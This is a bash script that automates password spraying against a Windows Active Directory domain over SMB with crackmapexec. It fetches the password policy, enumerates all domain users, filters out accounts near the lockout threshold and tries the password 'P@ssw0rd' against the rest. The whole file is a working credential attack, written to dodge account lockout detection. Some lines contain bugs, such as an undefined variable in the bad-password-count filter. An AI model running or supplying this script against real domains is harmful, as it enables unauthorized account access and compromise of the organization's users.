#!/bin/bash


ip=""
username=""
password=""
account_lockout_threshold=0

check_for_crackmapexec() {
	if ! command -v crackmapexec &> /dev/null
	then
		echo "sudo apt-get install crackmapexec"
		exit
	fi
}

get_all_users() {
	crackmapexec smb $ip -u $username -p $password --users > /tmp/users.txt
}

get_users_with_suitable_badpwdtime() {
	cat /tmp/users.txt | grep -Eiw "badpwdcount: [0-$abc]" | awk '{print $5}' | cut -d '\' -f2 | tee /tmp/all_suitable_users.txt
}

start_brute_with_suitable_users() {
	crackmapexec smb $ip -u /tmp/all_suitable_users.txt -p P@ssw0rd --continue-on-success | tee /tmp/spray_result.txt
}

get_domain_password_policy() {
	crackmapexec smb $ip -u $username -p $password --pass-pol | tee /tmp/pass_policy
	account_lockout_threshold=$(cat /tmp/pass_policy | grep "Account Lockout Threshold:" | awk -F ':' '{print $2}')
	b=0.4 # 0.4 = 40%
	safe_badpwdtime=$(echo "$account_lockout_threshold $b" | awk '{print $1 * $2}')
}

get_args() {
	# if (($# != 3)); then
 #    	echo "./spray.sh 10.11.1.195 ilsaf.nabiullin P@ssw0rd"
	# fi
    ip=${commandline_args[0]};
    username=${commandline_args[1]}
    password=${commandline_args[2]}
}

start() {
	get_args $1 $2 $3
	check_for_crackmapexec
	get_domain_password_policy
	get_all_users
	get_users_with_suitable_badpwdtime
	start_brute_with_suitable_users
}

commandline_args=("$@")

start
